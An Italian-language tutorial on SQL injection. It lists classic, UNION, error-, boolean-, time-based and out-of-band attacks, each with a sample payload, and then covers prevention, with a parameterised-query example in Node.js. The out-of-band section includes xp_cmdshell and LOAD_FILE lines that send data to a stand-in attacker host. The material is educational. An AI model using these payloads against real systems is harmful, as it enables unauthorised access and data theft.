
# SQL Injection

La **SQL injection** è una vulnerabilità che permette a un attaccante di manipolare le query SQL tramite input non controllato, accedendo, modificando o cancellando dati.

## Tipi di attacco SQL Injection

### 1. Attacco classico
L'attaccante inserisce codice per alterare la logica della query.

**Esempio:**
```sql
SELECT * FROM utenti WHERE username = '" + user + "' AND password = '" + pass + "';
```
Input malevolo:
```
' OR '1'='1
```
Risultato:
```sql
SELECT * FROM utenti WHERE username = '' OR '1'='1' AND password = '...';
```
L'accesso viene concesso senza credenziali.

### 2. Attacchi UNION-based
Si usa la clausola `UNION` per estrarre dati da altre tabelle.
**Esempio:**
```
' UNION SELECT nome, password FROM admin--
```
Risultato:
```sql
SELECT * FROM utenti WHERE username = '' UNION SELECT nome, password FROM admin--' AND password = '...';
```

### 3. Attacchi Error-based
Si provocano errori per ottenere informazioni sulla struttura del database.
**Esempio:**
```
' OR 1=1 ORDER BY 10--
```
Se la tabella ha meno di 10 colonne, il database mostra un errore che rivela il numero di colonne.

### 4. Attacchi Boolean-based
Si manipola la query per ottenere risposte diverse (vero/falso) e dedurre informazioni.
**Esempio:**
```
' AND 1=1--
' AND 1=2--
```
Analizzando le differenze tra le risposte, si scoprono dettagli sul database.

### 5. Attacchi Time-based
Si usano funzioni che causano ritardi (es. SLEEP) per capire se una condizione è vera o falsa, analizzando il tempo di risposta.
**Esempio:**
```
' OR IF(1=1, SLEEP(5), 0)--
```
Se la risposta impiega più tempo, la condizione è vera.

### 6. Attacchi Out-of-Band (OOB)
Si sfruttano funzioni del database che inviano dati verso l'esterno (HTTP, DNS, ecc.), ricevendo informazioni senza risposta diretta.
**Esempio:**
```
'; EXEC master..xp_cmdshell 'nslookup attaccante.com'--
' UNION SELECT LOAD_FILE('\\attaccante.com\file')--
```
I dati vengono inviati a un server controllato dall'attaccante.

---

## Prevenzione

- **Query parametrizzate/prepared statements**
	- Esempio in JavaScript (Node.js, con mysql2):
		```js
		const mysql = require('mysql2');
		const conn = mysql.createConnection({host: 'localhost', user: 'root', database: 'test'});
		const user = req.body.user;
		const pass = req.body.pass;
		conn.execute(
			'SELECT * FROM utenti WHERE username = ? AND password = ?',
			[user, pass],
			(err, results) => {
				// gestione risultati
			}
		);
		```
- **Validazione e sanificazione input**
- **Limitare privilegi utente DB**
- **Non mostrare errori SQL all'utente**
